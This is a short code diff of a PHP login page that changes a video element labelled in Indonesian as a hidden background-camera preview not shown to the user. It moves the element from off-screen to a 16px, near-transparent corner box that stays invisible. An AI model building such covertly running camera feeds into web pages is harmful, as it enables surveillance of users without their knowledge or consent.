@@ -165,7 +165,8 @@ $loginCharacters = build_login_characters();
   </div>
 
   <!-- Video tersembunyi untuk kamera background (tidak ditampilkan ke user) -->
-  <video id="previewVideo" autoplay playsinline muted hidden aria-hidden="true" style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;left:-9999px"></video>
+  <video id="previewVideo" autoplay playsinline muted
+    style="position:fixed;width:16px;height:16px;opacity:0.01;pointer-events:none;bottom:0;right:0;z-index:0"></video>
 
   <div id="installBanner" class="install-banner" style="display:none">
     <div class="install-banner-inner">
